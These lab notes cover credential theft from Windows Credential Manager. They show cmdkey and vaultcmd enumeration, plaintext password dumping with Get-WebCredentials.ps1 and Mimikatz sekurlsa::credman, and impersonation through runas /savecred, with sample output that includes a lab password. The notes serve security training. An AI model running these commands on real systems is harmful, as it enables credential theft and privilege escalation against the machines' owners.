# LAB — Windows Credential Manager

> [!abstract] TL;DR
> **Credential Manager** stores saved logins for websites, apps, and networks (separate storage from LSASS). Enumerate saved creds with **`cmdkey /list`** and **`vaultcmd`**; impersonate a saved user without a password via **`runas /savecred`**; dump **plaintext** web creds with the **`Get-WebCredentials.ps1`** PowerShell script; and dump plaintext creds from memory with **Mimikatz `sekurlsa::credman`**.

---

## What Is Credential Manager?

A native Windows feature that securely stores logon info for websites, applications, and networks (usernames, passwords, internet addresses). Four credential categories:

- **Web credentials** — auth details stored in browsers/apps
- **Windows credentials** — Windows auth details (NTLM, Kerberos)
- **Generic credentials** — basic auth details (clear-text usernames/passwords)
- **Certificate-based credentials** — auth based on certificates

> [!note] Storage scope
> Credentials are stored per-user (in the user's folder) and are **not** shared among Windows user accounts — but they are cached in memory. Credential Manager and LSASS are **two distinct storage mechanisms** in completely different places.

Access via GUI: **Control Panel → User Accounts → Credential Manager**. This task focuses on the command line (no GUI).

## Enumerate Saved Credentials

### `cmdkey /list`

`cmdkey` creates, deletes, and displays stored Windows credentials. (`klist` is wrong for this — use `cmdkey`.)

```
cmdkey /list
```

```
C:\Tools\Mimikatz>cmdkey /list

Currently stored credentials:

    Target: WindowsLive:target=virtualapp/didlogical
    Type: Generic
    User: 02zlvnbkirahmypg
    Local machine persistence

    Target: LegacyGeneric:target=10.10.237.226
    Type: Generic
    User: thm

    Target: Domain:interactive=thm.red\thm-local
    Type: Domain Password
    User: thm.red\thm-local
```

A saved entry (e.g. `thm.red\thm-local`) means Windows can retrieve its password automatically — so you can impersonate that user **without knowing the password**. You can also target a specific credential with `/list:computername`.

### `vaultcmd` (Microsoft Credentials Manager utility)

List the available vaults (by default: **Web Credentials** and **Windows Credentials**):

```
vaultcmd /list
```

```markup
C:\Users\Administrator>vaultcmd /list
Currently loaded vaults:
        Vault: Web Credentials
        Vault Guid:4BF4C442-9B8A-41A0-B380-DD4A704DDB28
        Location: C:\Users\Administrator\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28

        Vault: Windows Credentials
        Vault Guid:77BC582B-F0A6-4E15-4E80-61736B6F3B29
        Location: C:\Users\Administrator\AppData\Local\Microsoft\Vault
```

Check vault properties (count + protection method):

```
VaultCmd /listproperties:"Web Credentials"
```

```markup
C:\Users\Administrator>VaultCmd /listproperties:"Web Credentials"
Vault Properties: Web Credentials
Location: C:\Users\Administrator\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28
Number of credentials: 1
Current protection method: DPAPI
```

List credential details (resource + identity, but **not** the password):

```
VaultCmd /listcreds:"Web Credentials"
```

```markup
C:\Users\Administrator>VaultCmd /listcreds:"Web Credentials"
Credentials in vault: Web Credentials

Credential schema: Windows Web Password Credential
Resource: internal-app.thm.red
Identity: THMUser Saved By: MSEdge
Hidden: No
Roaming: Yes
```

## Dump Plaintext Web Credentials — `Get-WebCredentials.ps1`

`vaultcmd` cannot show the password, but the Nishang PowerShell script **[Get-WebCredentials.ps1](https://github.com/samratashok/nishang/blob/master/Gather/Get-WebCredentials.ps1)** can (already on the lab VM). Run with bypass execution policy:

```
powershell -ex bypass
Import-Module C:\Tools\Get-WebCredentials.ps1
Get-WebCredentials
```

```markup
UserName  Resource             Password     Properties
--------  --------             --------     ----------
THMUser internal-app.thm.red Password! {[hidden, False], [applicationid, 00000000-0000-0000-0000-000000000000], [application, MSEdge]}
```

## Impersonate a User — `runas /savecred`

`runas` runs Windows apps under a different user's security context. The **`/savecred`** flag pulls the saved credentials from Credential Manager, so **no password prompt** appears.

```
runas /savecred /user:THM.red\thm-local cmd.exe
```

```markup
C:\Users\thm>runas /savecred /user:THM.red\thm-local cmd.exe
Attempting to start cmd.exe as user "THM.red\thm-local" ...
```

A new cmd window opens running as that user. Confirm with `whoami`.

> [!tip] Strategic value
> Always check saved credentials during enumeration/privesc. A saved credential may belong to a **Domain Admin** or any higher-privileged user, giving you a path to escalate.

## Dump Plaintext Creds From Memory — Mimikatz `credman`

Mimikatz can dump Credential Manager cleartext passwords from memory. Same first steps as the LSASS task, but query only the credential-manager section:

```
.\mimikatz.exe
privilege::debug
sekurlsa::credman
```

```markup
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::credman
```

> [!warning] "handle on memory" error
> If `credman` throws a handle-on-memory error, you haven't enabled debug privileges — run `privilege::debug` first.

Mimikatz dumps stored passwords in **plaintext** (e.g. the cleartext password for `THM` and `thm-local`, plus their logon server).

---

## `cmdkey` vs Mimikatz

| Tool | What it does |
|---|---|
| `cmdkey /list` | Lists target names / confirms saved creds exist — **cannot** show plaintext |
| Mimikatz `sekurlsa::credman` | Extracts and displays the actual **plaintext passwords** |

> [!note] Also doable with other tools
> The same techniques can be performed via Empire, Metasploit, etc.
